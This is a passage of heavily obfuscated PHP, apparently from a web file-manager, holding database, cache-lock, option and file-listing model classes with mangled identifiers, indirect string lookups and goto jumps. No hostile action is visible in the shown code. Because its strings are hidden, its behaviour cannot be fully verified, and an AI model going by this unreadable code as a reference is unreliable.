$ÉüÛøõ¬[$­³äÅ‡ƒ[53]], $­³äÅ‡ƒ[36] => (bool) $ÉüÛøõ¬[$­³äÅ‡ƒ[54]], $­³äÅ‡ƒ[39] => (bool) $ÉüÛøõ¬[$­³äÅ‡ƒ[54]]); } } return $êÕ•¢§ú; } public function getTables($ø‰Ë ÁŠ = '') { $»¹àßÛ =& $_SERVER[ÏÒ Ì„]; $èÀ”¸Æµ = $this->query($»¹àßÛ[42] . $»¹àßÛ[43] . $»¹àßÛ[44]); $š–É®Š¯ = array(); foreach ($èÀ”¸Æµ as $ñöáÙûç => $«Ë’‡ôù) { $š–É®Š¯[$ñöáÙûç] = current($«Ë’‡ôù); } return $š–É®Š¯; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $èá×¿üÜ =& $_SERVER[ÏÒ Ì„]; $this->error = $this->_linkID->lastErrorMsg(); if ($èá×¿üÜ[33] != $this->queryStr) { $this->error .= LNG($èá×¿üÜ[45]) . $this->queryStr; } think_trace($this->error, $èá×¿üÜ[33], $èá×¿üÜ[46]); return $this->error; } public function escapeString($¹Ÿøº§å) { $™¼ö™¥š =& $_SERVER[ÏÒ Ì„]; if ($this->_linkID) { return $this->_linkID->escapeString($¹Ÿøº§å); } return str_ireplace($™¼ö™¥š[55], $™¼ö™¥š[56], $¹Ÿøº§å); } public function parseLimit($½÷î£Û) { $ÒÚÓÇ‰õ =& $_SERVER[ÏÒ Ì„]; $âãì»½É = $ÒÚÓÇ‰õ[33]; if (!empty($½÷î£Û)) { $½÷î£Û = explode($ÒÚÓÇ‰õ[47], $½÷î£Û); if (count($½÷î£Û) > 1) { $âãì»½É .= $ÒÚÓÇ‰õ[48] . $½÷î£Û[1] . $ÒÚÓÇ‰õ[49] . $½÷î£Û[0] . $ÒÚÓÇ‰õ[50]; } else { $âãì»½É .= $ÒÚÓÇ‰õ[48] . $½÷î£Û[0] . $ÒÚÓÇ‰õ[50]; } } return $âãì»½É; } } goto DÓœ¾ÍÏ„¾; e‘À±ëšù®: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $›ûôüØ½ =& $_SERVER[ÏÒ Ì„]; $¬Œµã’ç = $GLOBALS[$›ûôüØ½[6]][$›ûôüØ½[347]]; self::$cachePath = $¬Œµã’ç[$›ûôüØ½[193]][$›ûôüØ½[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¨í°ÑòÄ, $Í¯˜ = 0) { $–÷¶é† =& $_SERVER[ÏÒ Ì„]; $¼ïù´·¡ = microtime(!0); $õÉä©ˆ• = $¼ïù´·¡ + $Í¯˜ + 0.0001; $µğ©šûı = rtrim(self::$cachePath, $–÷¶é†[8]) . $–÷¶é†[856] . md5($¨í°ÑòÄ) . $–÷¶é†[853]; if (file_exists($µğ©šûı) && filemtime($µğ©šûı) && filemtime($µğ©šûı) < time() - 10) { @unlink($µğ©šûı); } do { if (file_exists($µğ©šûı)) { cacheLockWait(); continue; } $Âšâ—ê§ = fopen($µğ©šûı, $–÷¶é†[857]); if (!$Âšâ—ê§) { return !1; } $Ñ’­‹Ù = flock($Âšâ—ê§, LOCK_EX | LOCK_NB); self::$caches[$¨í°ÑòÄ] = array($–÷¶é†[858] => $Âšâ—ê§, $–÷¶é†[193] => $µğ©šûı); fwrite($Âšâ—ê§, $õÉä©ˆ•); clearstatcache(); if ($Âšâ—ê§ && $Ñ’­‹Ù) { return !0; } cacheLockWait(); } while (microtime(!0) < $õÉä©ˆ•); $this->unlock($¨í°ÑòÄ); return !1; } public function lockGet($ßª¢ş¦å) { $Ûşíá÷  =& $_SERVER[ÏÒ Ì„]; $¸¹Ó×ÉŸ = rtrim(self::$cachePath, $Ûşíá÷ [8]) . $Ûşíá÷ [856] . md5($ßª¢ş¦å) . $Ûşíá÷ [853]; return file_exists($¸¹Ó×ÉŸ); } public function unlock($ø¨†ğš) { $¯¹Éê¨í =& $_SERVER[ÏÒ Ì„]; $òî€…ôÄ = self::$caches[$ø¨†ğš]; if (!$òî€…ôÄ) { return; } @flock($òî€…ôÄ[$¯¹Éê¨í[858]], LOCK_UN); @fclose($òî€…ôÄ[$¯¹Éê¨í[858]]); @unlink($òî€…ôÄ[$¯¹Éê¨í[193]]); unset(self::$caches[$ø¨†ğš]); } } class CacheLockRedis { public function lock($ÂÅêºÖÈ, $æÙŠË©Æ = 10) { $¬Å¯µà” = Cache::init(); $Ä¦õîÈ = microtime(!0) + $æÙŠË©Æ; while (microtime(!0) < $Ä¦õîÈ) { $ÀÖñÇüã = $¬Å¯µà”->get($ÂÅêºÖÈ); if (!$ÀÖñÇüã) { $‰á·¥ı‘ = $¬Å¯µà”->setLock($ÂÅêºÖÈ, $Ä¦õîÈ, $æÙŠË©Æ); if ($‰á·¥ı‘) { return !0; } } else { if ($ÀÖñÇüã < microtime(!0)) { $¬Å¯µà”->set($ÂÅêºÖÈ, $Ä¦õîÈ, $æÙŠË©Æ * 2); if ($¬Å¯µà”->get($ÂÅêºÖÈ) === $ÀÖñÇüã) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ç‹ÉÂŒ×) { return Cache::init()->get($Ç‹ÉÂŒ×); } public function unlock($çŠßÕõØ) { return Cache::init()->remove($çŠßÕõØ); } } class CacheLockMemcached { public function lock($ûˆî’æ, $…£«·õ = 0) { $Ş²Ô“ü = Cache::init(); $äå·ÍÕ× = microtime(!0) + $…£«·õ; while (microtime(!0) < $äå·ÍÕ×) { $¬Àºõ¤ = $Ş²Ô“ü->get($ûˆî’æ); if (!$¬Àºõ¤ || $¬Àºõ¤ < microtime(!0)) { $Ç‚ƒ¯ÔØ = $Ş²Ô“ü->handle->add($ûˆî’æ, $äå·ÍÕ×, $…£«·õ); if ($Ç‚ƒ¯ÔØ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($êÍÓ–ÖÍ) { return Cache::init()->get($êÍÓ–ÖÍ); } public function unlock($ÑÔ©Îıø) { return Cache::init()->remove($ÑÔ©Îıø); } } goto C¶Å‡¼ƒÆ; dš£ÖØóÑß: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ÿ Ñæú„ = false, $å« Âˆû = '', $äøêÇ²Ú = false) { $ò‰Öş¾ =& $_SERVER[ÏÒ Ì„]; $¥¦¥Ä¢ = $this->cacheGet($å« Âˆû); $ßÇñ×– = $this->optionDefault($å« Âˆû); $ßÇñ×– = is_array($ßÇñ×–) ? $ßÇñ×– : array(); if (is_array($¥¦¥Ä¢)) { $¥¦¥Ä¢ = array_merge($ßÇñ×–, $¥¦¥Ä¢); return $Ÿ Ñæú„ ? isset($¥¦¥Ä¢[$Ÿ Ñæú„]) ? $¥¦¥Ä¢[$Ÿ Ñæú„] : null : $¥¦¥Ä¢; } $ ÉØ­“Ë = $this->filterWhere(array($ò‰Öş¾[29] => $å« Âˆû)); $¥¦¥Ä¢ = $this->where($ ÉØ­“Ë)->select(); $¥¦¥Ä¢ = array_to_keyvalue($¥¦¥Ä¢, $ò‰Öş¾[93], $ò‰Öş¾[372]); foreach ($¥¦¥Ä¢ as $¡ÙÙí¤´ => $ˆ¼½‘á) { if ($äøêÇ²Ú || in_array($¡ÙÙí¤´, $this->jsonField)) { $¥¦¥Ä¢[$¡ÙÙí¤´] = json_decode($ˆ¼½‘á, !0); } } $this->cacheSet($å« Âˆû, $¥¦¥Ä¢); $¥¦¥Ä¢ = array_merge($ßÇñ×–, $¥¦¥Ä¢); return $Ÿ Ñæú„ ? $¥¦¥Ä¢[$Ÿ Ñæú„] : $¥¦¥Ä¢; } public function set($·¿ŠÍÅ°, $äğƒ…ÜË = false, $¢ìÒÜºğ = '') { $Ó‹øç’¹ =& $_SERVER[ÏÒ Ì„]; $this->cacheRemove($¢ìÒÜºğ); $üŒ”ÖëÂ = array(); $Í´Ò¸à = is_array($·¿ŠÍÅ°) ? $·¿ŠÍÅ° : array($·¿ŠÍÅ° => $äğƒ…ÜË); foreach ($Í´Ò¸à as $É×’Éš¹ => $€úØ™¹) { if (is_array($€úØ™¹)) { $€úØ™¹ = json_encode_force($€úØ™¹); } $this->checkLength($€úØ™¹, !1, $this->tableName . $Ó‹øç’¹[4] . $·¿ŠÍÅ°); $€úØ™¹ = self::textEncode($€úØ™¹); $Í´Ò¸à = array($Ó‹øç’¹[29] => $¢ìÒÜºğ, $Ó‹øç’¹[93] => $É×’Éš¹, $Ó‹øç’¹[372] => $€úØ™¹); $üŒ”ÖëÂ[] = $this->filterWhere($Í´Ò¸à); } if (!$üŒ”ÖëÂ) { return !0; } return $this->addAll($üŒ”ÖëÂ, array(), !0); } protected function optionDefault($ÌÍ®å·Ï = '') { return !1; } public function setDeep($ƒâÉ½ö², $¦ÆÏŒÖæ = false, $‡†¸¹ä = '') { $…ªÂ…„› = explode($_SERVER[ÏÒ Ì„][95], $ƒâÉ½ö²); $×ç¬Şë© = $this->get(); array_set_value($×ç¬Şë©, $ƒâÉ½ö², $¦ÆÏŒÖæ); $this->set($…ªÂ…„›[0], $×ç¬Şë©[$…ªÂ…„›[0]], $‡†¸¹ä); } public function remove($¥â©´ªì, $ó’‰Ñ¬­ = '') { $îÆÁ°úò =& $_SERVER[ÏÒ Ì„]; $this->cacheRemove($ó’‰Ñ¬­); $“àŠŞ¤ = $this->filterWhere(array($îÆÁ°úò[93] => $¥â©´ªì, $îÆÁ°úò[29] => $ó’‰Ñ¬­)); if (is_null($¥â©´ªì)) { unset($“àŠŞ¤[$îÆÁ°úò[93]]); } return $this->where($“àŠŞ¤)->delete(); } public function cacheSet($¯ÜÊà†, $ç–¤èá­ = false) { return Cache::set($this->cacheKey($¯ÜÊà†), $ç–¤èá­); } public function cacheGet($ÁÏùÂı”) { return Cache::get($this->cacheKey($ÁÏùÂı”)); } public function cacheRemove($ÓŠ¸˜½§) { return Cache::remove($this->cacheKey($ÓŠ¸˜½§)); } protected function filterWhere($Ü×»ô‡«) { return $Ü×»ô‡«; } protected function cacheKey($÷™÷‰©Â) { return $÷™÷‰©Â; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\x63\x65"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\x6d\x65" => "\x69\x6f\137\163\157\165\x72\x63\145\137\155\145\164\x61", "\155\145\x74\141\106\151\145\x6c\144" => "\x73\x6f\165\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\151\x6d\145", "\164\151\155\145", "\x69\156\x73\x65\x72\x74", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\143\x72\145\x61\x74\x65\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\x73\x65\162\164", "\146\x75\x6e\143\164\151\157\x6e"), array("\x76\151\x65\167\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\156\x73\145\162\x74", "\x66\165\156\143\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ª÷Íæ½Š) { return $this->listSource(array($_SERVER[ÏÒ Ì„][396] => $ª÷Íæ½Š)); } public function typeName($ÅÛ”¯ü—) { static $“²¡Ëï« = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $“²¡Ëï«[$ÅÛ”¯ü— . $_SERVER[ÏÒ Ì„][33]]; } public function sourceListInfo($âµ¹»÷, $ÖÖ‘Çü = false) { $Ø•Öà÷î =& $_SERVER[ÏÒ Ì„]; $âµ¹»÷ = $âµ¹»÷ ? $âµ¹»÷ : array(); $âµ¹»÷ = array_filter(array_unique($âµ¹»÷)); if (!$âµ¹»÷) { return array(); } $àæ¡ = $this->where(array($Ø•Öà÷î[397] => array($Ø•Öà÷î[7], $âµ¹»÷)))->select(); $this->_listDataApply($àæ¡, $ÖÖ‘Çü); return array_to_keyvalue($àæ¡, $Ø•Öà÷î[397]); } public function pathInfoFilter(&$Ÿš­ïÀÌ) { $€ñŒÆ°š =& $_SERVER[ÏÒ Ì„]; static $µÑÁ¤Ş = false; static $îÔèÍßÖ = false; static $õÜ›‡¸ = false; if (!$µÑÁ¤Ş) { $Îªıç×¹ = $€ñŒÆ°š[398]; $Îªıç×¹ .= $€ñŒÆ°š[399]; $Îªıç×¹ .= $€ñŒÆ°š[400]; $ŒİÄ²¿â = $€ñŒÆ°š[401]; $èÄ»ˆÖÓ = explode($€ñŒÆ°š[47], $ŒİÄ²¿â); $µÑÁ¤Ş = explode($€ñŒÆ°š[47], $Îªıç×¹); $îÔèÍßÖ = array(); foreach ($µÑÁ¤Ş as $òéÆÇô‰) { if (in_array($òéÆÇô‰, $èÄ»ˆÖÓ)) { continue; } $îÔèÍßÖ[] = $òéÆÇô‰; } $õÜ›‡¸ = explode($€ñŒÆ°š[47], $€ñŒÆ°š[402]); } foreach ($õÜ›‡¸ as $É”º–í) { if (isset($Ÿš­ïÀÌ[$É”º–í])) { $Ÿš­ïÀÌ[$É”º–í] = intval($Ÿš­ïÀÌ[$É”º–í]); } } $Ÿš­ïÀÌ[$€ñŒÆ°š[76]] = $€ñŒÆ°š[403] . $Ÿš­ïÀÌ[$€ñŒÆ°š[397]] . $€ñŒÆ°š[404]; $Ÿš­ïÀÌ[$€ñŒÆ°š[29]] = $Ÿš­ïÀÌ[$€ñŒÆ°š[405]] == 1 ? $€ñŒÆ°š[77] : $€ñŒÆ°š[193]; $Ÿš­ïÀÌ[$€ñŒÆ°š[406]] = $this->typeName($Ÿš­ïÀÌ[$€ñŒÆ°š[406]]); if ($Ÿš­ïÀÌ[$€ñŒÆ°š[405]] != 1) { $Ÿš­ïÀÌ[$€ñŒÆ°š[168]] = $Ÿš­ïÀÌ[$€ñŒÆ°š[407]]; unset($Ÿš­ïÀÌ[$€ñŒÆ°š[407]]); } $¾÷Á›õœ = $µÑÁ¤Ş; if (isset($Ÿš­ïÀÌ[$€ñŒÆ°š[408]]) && $Ÿš­ïÀÌ[$€ñŒÆ°š[408]][$€ñŒÆ°š[409]] == -1) { $¾÷Á›õœ = $îÔèÍßÖ; } $Ÿš­ïÀÌ = array_field_key($Ÿš­ïÀÌ, $¾÷Á›õœ); return $Ÿš­ïÀÌ; } public function listUserFav() { $¡ßıªÑª =& $_SERVER[ÏÒ Ì„]; $Í¥”á¨ = Model($¡ßıªÑª[410])->listData(); $Ç˜¬û¿• = array_filter_by_field($Í¥”á¨, $¡ßıªÑª[29], $¡ßıªÑª[411]); $Ç˜¬û¿• = array_to_keyvalue($Ç˜¬û¿•, $¡ßıªÑª[33], $¡ßıªÑª[76]); if ($Ç˜¬û¿•) { $Ñ¤ó†óå = $this->listSource(array($¡ßıªÑª[412] => array($¡ßıªÑª[413], $Ç˜¬û¿•))); } $Ñ¤ó†óå = array_to_keyvalue($Ñ¤ó†óå[$¡ßıªÑª[367]], $¡ßıªÑª[397]); foreach ($Í¥”á¨ as &$Æ¤ĞÇÈ) { $Æ¤ĞÇÈ = array($¡ßıªÑª[414] => $Æ¤ĞÇÈ[$¡ßıªÑª[395]], $¡ßıªÑª[415] => $Æ¤ĞÇÈ[$¡ßıªÑª[28]], $¡ßıªÑª[416] => $Æ¤ĞÇÈ[$¡ßıªÑª[76]], $¡ßıªÑª[417] => $Æ¤ĞÇÈ[$¡ßıªÑª[29]], $¡ßıªÑª[418] => $Æ¤ĞÇÈ[$¡ßıªÑª[194]], $¡ßıªÑª[419] => $Æ¤ĞÇÈ[$¡ßıªÑª[84]]); if ($Æ¤ĞÇÈ[$¡ßıªÑª[29]] == $¡ßıªÑª[411] && $Ñ¤ó†óå[$Æ¤ĞÇÈ[$¡ßıªÑª[76]]]) { $Æ¤ĞÇÈ[$¡ßıªÑª[85]] = $Ñ¤ó†óå[$Æ¤ĞÇÈ[$¡ßıªÑª[76]]]; } } unset($Æ¤ĞÇÈ); return $Í¥”á¨; } public function listUserTag($š’Ò´´) { $¯’å¤£ =& $_SERVER[ÏÒ Ì„]; if ($š’Ò´´ && !is_array($š’Ò´´)) { $š’Ò´´ = array($š’Ò´´); } $Ô¶İ†¿È = Model($¯’å¤£[420])->listData(); $‡•áå×õ = array(); foreach ($Ô¶İ†¿È as $½ş—ÜªÃ) { $”»¾«ì = $½ş—ÜªÃ[$¯’å¤£[76]]; if (!$”»¾«ì) { continue; } if (!isset($‡•áå×õ[$”»¾«ì])) { $‡•áå×õ[$”»¾«ì] = array(); } $‡•áå×õ[$”»¾«ì][] = $½ş—ÜªÃ[$¯’å¤£[421]]; } $ûÙÌå„› = array(); foreach ($‡•áå×õ as $ÆöºÆÌÏ => $Óİ•¹“†) { $„´åš‰» = !0; if (!$š’Ò´´) { $ûÙÌå„›[] = $ÆöºÆÌÏ; continue; } foreach ($š’Ò´´ as $ÃÊúƒä) { if (!in_array($ÃÊúƒä, $Óİ•¹“†)) { $„´åš‰» = !1; break; } } if ($„´åš‰») { $ûÙÌå„›[] = $ÆöºÆÌÏ; } } if (!$ûÙÌå„›) { return array(); } $Ü¢‚îæ¡ = $this->listSource(array($¯’å¤£[412] => array($¯’å¤£[413], $ûÙÌå„›))); if (!$Ü¢‚îæ¡ || count($ûÙÌå„›) == $Ü¢‚îæ¡[$¯’å¤£[364]][$¯’å¤£[365]]) { return $Ü¢‚îæ¡; } $®» ãûÇ = array(); $íŸóóôŞ = array_to_keyvalue($Ü¢‚îæ¡[$¯’å¤£[75]], $¯’å¤£[33], $¯’å¤£[397]); $øÑ»²€Â = array_to_keyvalue($Ü¢‚îæ¡[$¯’å¤£[74]], $¯’å¤£[33], $¯’å¤£[397]); $…½‰Š = array_merge($øÑ»²€Â, $íŸóóôŞ); foreach ($ûÙÌå„› as $”»¾«ì) { if (!in_array($”»¾«ì, $…½‰Š)) { $®» ãûÇ[] = $”»¾«ì; } } if ($®» ãûÇ) { Model($¯’å¤£[422])->removeBySource($®» ãûÇ); } return $Ü¢‚îæ¡; } public function listUserRecycle() { $ï×˜ã½° =& $_SERVER[ÏÒ Ì„]; $ú½•¯Á¨ = Model($ï×˜ã½°[423])->listData(); if (!$ú½•¯Á¨) { return array(); } $ÙìğŞ–Ã = array($ï×˜ã½°[412] => array($ï×˜ã½°[413], $ú½•¯Á¨), $ï×˜ã½°[424] => 1); return $this->listSource($ÙìğŞ–Ã); } public function listSource($úîŸ¨úû, $¦²ëÄ‹½ = 3000) { $éÉ—¬Üº =& $_SERVER[ÏÒ Ì„]; if (!isset($úîŸ¨úû[$éÉ—¬Üº[425]])) { $úîŸ¨úû[$éÉ—¬Üº[425]] = 0; } $°ğ´…ŞÊ = $éÉ—¬Üº[426]; $ÀáªïÓ¯ = $this->field($°ğ´…ŞÊ)->_makeOrder()->where($úîŸ¨úû)->selectPage($¦²ëÄ‹½); $this->_listPageCheck($ÀáªïÓ¯, $°ğ´…ŞÊ, $úîŸ¨úû); $this->_listDataApply($ÀáªïÓ¯[$éÉ—¬Üº[367]]); $this->_listMake($ÀáªïÓ¯); return $ÀáªïÓ¯; } private function _listPageCheck(&$ê„ º«, $«Äç–Á«, $¥±İçù¨) { $¸‹¨·ó‘ =& $_SERVER[ÏÒ Ì„]; if (!is_array($ê„ º«[$¸‹¨·ó‘[364]])) { return; } $Ã€ŒÜ·‘ = $ê„ º«[$¸‹¨·ó‘[364]]; if ($Ã€ŒÜ·‘[$¸‹¨·ó‘[366]] <= 1) { return; } if ($Ã€ŒÜ·‘[$¸‹¨·ó‘[365]] >= 100000) { return; } if (Model($¸‹¨·ó‘[427])->get($¸‹¨·ó‘[428]) != $¸‹¨·ó‘[429]) { return; } $«Äç–Á« = str_replace(array($¸‹¨·ó‘[50], $¸‹¨·ó‘[340], $¸‹¨·ó‘[229]), $¸‹¨·ó‘[33], $«Äç–Á«); $«Äç–Á« = $¸‹¨·ó‘[430] . str_replace($¸‹¨·ó‘[47], $¸‹¨·ó‘[431], $«Äç–Á«) . $¸‹¨·ó‘[432]; $¨™àêí = $¸‹¨·ó‘[433]; $¨™àêí = $¨™àêí . $¸‹¨·ó‘[434]; $ú±ß¹†‘ = $Ã€ŒÜ·‘[$¸‹¨·ó‘[361]] * ($Ã€ŒÜ·‘[$¸‹¨·ó‘[351]] - 1) . $¸‹¨·ó‘[47] . $Ã€ŒÜ·‘[$¸‹¨·ó‘[361]]; $¦øçı±¸ = $this->_makeOrder(!0); $Ãƒ÷ß½¢ = $¸‹¨·ó‘[430] . str_replace($¸‹¨·ó‘[47], $¸‹¨·ó‘[431], $¦øçı±¸[0]); if (strpos($Ãƒ÷ß½¢, $¸‹¨·ó‘[435])) { $Ãƒ÷ß½¢ = str_replace($¸‹¨·ó‘[435], $¸‹¨·ó‘[436], $Ãƒ÷ß½¢); } else { $Ãƒ÷ß½¢ .= $¸‹¨·ó‘[437] . $¦øçı±¸[1]; } $–Ñ«–Á = array(); foreach ($¥±İçù¨ as $ÕÒÏºÖ‘ => $±†Á¿ÍÀ) { $–Ñ«–Á[$¸‹¨·ó‘[430] . $ÕÒÏºÖ‘] = $±†Á¿ÍÀ; } $this->alias($¸‹¨·ó‘[438])->field($«Äç–Á«)->limit($ú±ß¹†‘)->order($Ãƒ÷ß½¢); $—ğèåœø = $this->join($¨™àêí)->where($–Ñ«–Á)->select(); if ($—ğèåœø) { $ê„ º«[$¸‹¨·ó‘[367]] = $—ğèåœø; } } protected function _makeOrder($¾¤æ±± = false) { $¶ÑèùŸó =& $_SERVER[ÏÒ Ì„]; $ì©úÃİæ = Model($¶ÑèùŸó[439])->get($¶ÑèùŸó[440]); $øÎÓéÄ = Model($¶ÑèùŸó[439])->get($¶ÑèùŸó[441]); $À“ğòó = array($¶ÑèùŸó[442] => $¶ÑèùŸó[443], $¶ÑèùŸó[444] => $¶ÑèùŸó[445]); $­æûÖï = array($¶ÑèùŸó[28] => $¶ÑèùŸó[28], $¶ÑèùŸó[78] => $¶ÑèùŸó[78], $¶ÑèùŸó[168] => $¶ÑèùŸó[407], $¶ÑèùŸó[446] => $¶ÑèùŸó[446], $¶ÑèùŸó[447] => $¶ÑèùŸó[448], $¶ÑèùŸó[194] => $¶ÑèùŸó[194], $¶ÑèùŸó[84] => $¶ÑèùŸó[84]); $¥ ÏíÃï = Input::get($¶ÑèùŸó[449], $¶ÑèùŸó[7], $ì©úÃİæ, array_keys($­æûÖï)); $¥õî–Ìç = Input::get($¶ÑèùŸó[450], $¶ÑèùŸó[7], $øÎÓéÄ, array_keys($À“ğòó)); if (!in_array($¥ ÏíÃï, array_keys($­æûÖï))) { $¥ ÏíÃï = $¶ÑèùŸó[28]; } if (!in_array($¥õî–Ìç, array_keys($À“ğòó))) { $¥ ÏíÃï = $¶ÑèùŸó[442]; } if ($¥ ÏíÃï == $¶ÑèùŸó[28]) { } $ÚòÁÎ½™ = $¶ÑèùŸó[451] . $­æûÖï[$¥ ÏíÃï] . $¶ÑèùŸó[50] . $À“ğòó[$¥õî–Ìç]; $ÚòÁÎ½™ = rtrim(trim($ÚòÁÎ½™), $¶ÑèùŸó[47]); if ($¾¤æ±±) { return array($ÚòÁÎ½™, $À“ğòó[$¥õî–Ìç]); } return $this->order($ÚòÁÎ½™); } protected function _listDataApplyItem($Ç¥òÔÜû, $ÎİÙçÀè = false) { $ à¹îÉ– = array($Ç¥òÔÜû); $this->_listDataApply($ à¹îÉ–, $ÎİÙçÀè); return $ à¹îÉ–[0]; } protected function _listDataApply(&$”£¨ßÍñ, $Ğóß°’ = false) { $¯êÎÃÌ =& $_SERVER[ÏÒ Ì„]; if (!$”£¨ßÍñ) { $”£¨ßÍñ = array(); return; } $öÑÀ¯½ = array_to_keyvalue($”£¨ßÍñ, $¯êÎÃÌ[33], $¯êÎÃÌ[397]); $öÑÀ¯½ = array_unique($öÑÀ¯½); $this->_listSourceCache($”£¨ßÍñ); if (!$Ğóß°’) { $this->_listAppendMeta($”£¨ßÍñ, $öÑÀ¯½); $this->_listAppendFileMeta($”£¨ßÍñ, $öÑÀ¯½); $this->_listAppendChildren($”£¨ßÍñ, $öÑÀ¯½); } $this->_listAppendPath($”£¨ßÍñ); $this->_listAppendAuth($”£¨ßÍñ); $this->_listAppendSourceInfo($”£¨ßÍñ, $öÑÀ¯½); $this->_listAppendUser($”£¨ßÍñ); $this->_listFilterInfo($”£¨ßÍñ, $Ğóß°’); $this->_listAppendAuthSecret($”£¨ßÍñ); } protected function _listSourceCache($·úÌéµä) { $äâÅŸâÇ =& $_SERVER[ÏÒ Ì„]; foreach ($·úÌéµä as $ëÄíúÒ) { self::$cacheSourceInfo[$äâÅŸâÇ[452] . $ëÄíúÒ[$äâÅŸâÇ[397]]] = $ëÄíúÒ; } } protected function _listFilterInfo(&$¦ÓğÈƒÒ, $»äƒÏàŒ = false) { $»¶§÷çä =& $_SERVER[ÏÒ Ì„]; foreach ($¦ÓğÈƒÒ as &$Ìüœªİı) { $Ìüœªİı = $this->pathInfoFilter($Ìüœªİı); self::$cachePathInfo[$»¶§÷çä[453] . intval($»äƒÏàŒ) . $»¶§÷çä[454] . $Ìüœªİı[$»¶§÷çä[397]]] = $Ìüœªİı; } unset($Ìüœªİı); } protected function _listMake(&$Ğïö€ƒ‚) { $øôÌáĞ‹ =& $_SERVER[ÏÒ Ì„]; $Ğïö€ƒ‚[$øôÌáĞ‹[75]] = array(); $Ğïö€ƒ‚[$øôÌáĞ‹[74]] = array(); foreach ($Ğïö€ƒ‚[$øôÌáĞ‹[367]] as $äŠğº„) { $«Œ®–Øˆ = $äŠğº„[$øôÌáĞ‹[405]] == 1 ? $øôÌáĞ‹[75] : $øôÌáĞ‹[74]; $Ğïö€ƒ‚[$«Œ®–Øˆ][] = $äŠğº„; } unset($Ğïö€ƒ‚[$øôÌáĞ‹[367]]); } protected function _listAppendMeta(&$ş¦ÒÊ», $ŒŸÖªô×) { $œº‰Û¯Ü =& $_SERVER[ÏÒ Ì„]; $¤¯×ª = array($œº‰Û¯Ü[412] => array($œº‰Û¯Ü[413], $ŒŸÖªô×)); $ÌòïÔÂ¡ = Model($œº‰Û¯Ü[455])->field($œº‰Û¯Ü[456])->where($¤¯×ª)->select(); if (!$ÌòïÔÂ¡) { return; } $çúİŞª› = array($œº‰Û¯Ü[457], $œº‰Û¯Ü[458], $œº‰Û¯Ü[436]); $æ‡ÏÅûÌ = array(); foreach ($ÌòïÔÂ¡ as $¬öê¦Œ¸) { if (!isset($æ‡ÏÅûÌ[$¬öê¦Œ¸[$œº‰Û¯Ü[397]]])) { $æ‡ÏÅûÌ[$¬öê¦Œ¸[$œº‰Û¯Ü[397]]] = array(); } if (in_array($¬öê¦Œ¸[$œº‰Û¯Ü[93]], $çúİŞª›)) { continue; } $æ‡ÏÅûÌ[$¬öê¦Œ¸[$œº‰Û¯Ü[397]]][$¬öê¦Œ¸[$œº‰Û¯Ü[93]]] = $¬öê¦Œ¸[$œº‰Û¯Ü[372]]; } foreach ($ş¦ÒÊ» as &$®ŸÊçõò) { $®ŸÊçõò[$œº‰Û¯Ü[459]] = !1; if (isset($æ‡ÏÅûÌ[$®ŸÊçõò[$œº‰Û¯Ü[397]]])) { $®ŸÊçõò[$œº‰Û¯Ü[459]] = $æ‡ÏÅûÌ[$®ŸÊçõò[$œº‰Û¯Ü[397]]]; } if ($this->fileIsLock($®ŸÊçõò) && $®ŸÊçõò[$œº‰Û¯Ü[408]]) { $öŸÅÊ¡Ú = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $®ŸÊçõò[$œº‰Û¯Ü[408]][$œº‰Û¯Ü[409]] = AuthModel::authDisable($®ŸÊçõò[$œº‰Û¯Ü[408]][$œº‰Û¯Ü[409]], $öŸÅÊ¡Ú); $®ŸÊçõò[$œº‰Û¯Ü[408]][$œº‰Û¯Ü[460]][$œº‰Û¯Ü[408]] = $®ŸÊçõò[$œº‰Û¯Ü[408]][$œº‰Û¯Ü[409]]; } } unset($®ŸÊçõò); } protected function _listAppendFileMeta(&$ÙÍûß³°, $î®¸–çã) { $ÕŸİñä’ =& $_SERVER[ÏÒ Ì„]; $¬ª¯àá× = array_to_keyvalue($ÙÍûß³°, $ÕŸİñä’[33], $ÕŸİñä’[461]); $¬ª¯àá× = array_filter(array_unique($¬ª¯àá×)); if (!$¬ª¯àá×) { return; } $ ëú£Ë‚ = array($ÕŸİñä’[462] => array($ÕŸİñä’[413], $¬ª¯àá×)); $ÜÍ¿çì = $ÕŸİñä’[463]; $…Ò„¡Ú¹ = Model($ÕŸİñä’[464])->field($ÜÍ¿çì)->where($ ëú£Ë‚)->select(); $…Ò„¡Ú¹ = array_to_keyvalue($…Ò„¡Ú¹, $ÕŸİñä’[461]); $»Û¤¨ = Model($ÕŸİñä’[465])->field($ÕŸİñä’[466])->where($ ëú£Ë‚)->select(); $»Û¤¨ = $»Û¤¨ ? $»Û¤¨ : array(); $É£¼É¼— = array(); foreach ($»Û¤¨ as $ùŞ«ÂÎÈ) { if (!isset($É£¼É¼—[$ùŞ«ÂÎÈ[$ÕŸİñä’[461]]])) { $É£¼É¼—[$ùŞ«ÂÎÈ[$ÕŸİñä’[461]]] = array(); } $É£¼É¼—[$ùŞ«ÂÎÈ[$ÕŸİñä’[461]]][$ùŞ«ÂÎÈ[$ÕŸİñä’[93]]] = $ùŞ«ÂÎÈ[$ÕŸİñä’[372]]; } foreach ($ÙÍûß³° as &$ßç¼åìï) { $™õ¬İ®ô = $ßç¼åìï[$ÕŸİñä’[461]]; if (!$™õ¬İ®ô || !is_array($…Ò„¡Ú¹[$™õ¬İ®ô])) { continue; } $ûïÁÍ­ = 